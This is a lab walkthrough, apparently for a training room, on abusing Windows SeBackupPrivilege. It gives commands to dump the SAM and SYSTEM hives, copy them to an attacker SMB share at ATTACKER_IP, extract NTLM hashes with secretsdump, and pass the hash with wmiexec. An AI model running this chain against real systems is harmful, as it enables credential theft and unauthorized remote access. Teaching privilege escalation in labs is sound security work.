# What is SeBackupPrivilege?

`SeBackupPrivilege` is a Windows privilege that allows a user or service to perform **Backup operations** on protected files and registry data, even when the normal DACL permissions would otherwise prevent access.

This privilege is intended for legitimate backup operations, but it can be abused for **Privilege Escalation** and credential extraction when assigned to a low-privileged account.

In this lab, we use `SeBackupPrivilege` to obtain copies of the **SAM** and **SYSTEM** Registry Hives, extract local account NTLM hashes, and then use the extracted hash for **Pass-the-Hash** authentication.

---

# Lab

## Step 1 — Check for SeBackupPrivilege

Before attempting to abuse the privilege, we first verify whether the current user has `SeBackupPrivilege`.

The following command displays the privileges associated with the current Windows access token:

```
whoami /priv
```

![](../../../../Images/Pasted%20image%2020260925011700.png)

Look for:

```
SeBackupPrivilege
```

If the privilege is present but shown as `Disabled`, it still exists in the token. It may be enabled when required by a privileged operation.

---

## Step 2 — Back Up the SYSTEM Hive

To extract credentials from the SAM, we first need a copy of the `SYSTEM` Registry Hive.

The `SYSTEM` Hive contains information required to process the protected data stored in the SAM.

We use `reg save` to create a backup copy of the Hive:

```
reg save hklm\system C:\Users\THMBackup\system.hive
```

This saves the `HKLM\SYSTEM` Registry Hive as `system.hive`.

![](../../../../Images/Pasted%20image%2020260925012154.png)

---

## Step 3 — Back Up the SAM Hive

Next, we create a backup copy of the `SAM` Registry Hive:

```
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

The SAM contains the local Windows account credential data, including password hashes.

![](../../../../Images/Pasted%20image%2020260925012314.png)

At this point, we have:

```
system.hive
sam.hive
```

These are Registry Hive files containing copies of the relevant Windows Registry data.

---

## Step 4 — Transfer the Hives to the Attacker Machine

The Hive files need to be transferred to our Kali machine so they can be analyzed offline.

We set up an SMB server on the attacker machine using Impacket:

```
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This creates an SMB share named `public` backed by the local `share` directory.

![](../../../../Images/Pasted%20image%2020260925012831.png)

We then copy the Hive files from the Windows machine to the SMB share:

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

![](../../../../Images/Pasted%20image%2020260925013148.png)

The files are now available on the Kali machine for offline analysis.

---

# Step 5 — Extract NTLM Hashes

With both Registry Hives available locally, we can use Impacket's `secretsdump` to extract the local account hashes.

The following command processes the SAM using the SYSTEM Hive:

```
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

`-sam` specifies the SAM Hive, while `-system` specifies the SYSTEM Hive. `LOCAL` tells `secretsdump` that the files are local Hive files rather than a remote Windows system.

The tool extracts the local account information and NTLM hashes.

![](../../../../Images/Pasted%20image%2020260925014510.png)

The result contains entries similar to:

```
Administrator:500:<LM_HASH>:<NT_HASH>:::
```

The **NT hash** is the important value for the next stage.

---

# Step 6 — Pass-the-Hash

Once we have the NTLM hash, we do not necessarily need to know the user's plaintext password.

Windows authentication mechanisms can use the NTLM hash directly for authentication. This technique is known as **Pass-the-Hash**.

For example, Impacket's `wmiexec` can be used to authenticate using the extracted hash:

```
impacket-wmiexec Administrator@TARGET_IP -hashes <LM_HASH>:<NT_HASH>
```

![](../../../../Images/Pasted%20image%2020260925020439.png)

If the supplied account and hash are valid and the account has the required remote privileges, this can provide remote command execution on the target system.

---


# Key Takeaways

- `SeBackupPrivilege` allows privileged Backup operations against protected data.
- A user does not need to be a member of `Administrators` to possess this privilege.
- The `SAM` Hive contains local account credential information.
- The `SYSTEM` Hive provides information required to process the protected SAM data.
- `reg save` can be used to create copies of these Registry Hives.
- `secretsdump` can process the copied Hives and extract NTLM hashes.
- An NTLM hash can potentially be used for **Pass-the-Hash** authentication without knowing the plaintext password.
- The `.hive` extension is simply a conventional way to identify a Registry Hive file; the extension itself does not provide any privilege or special functionality.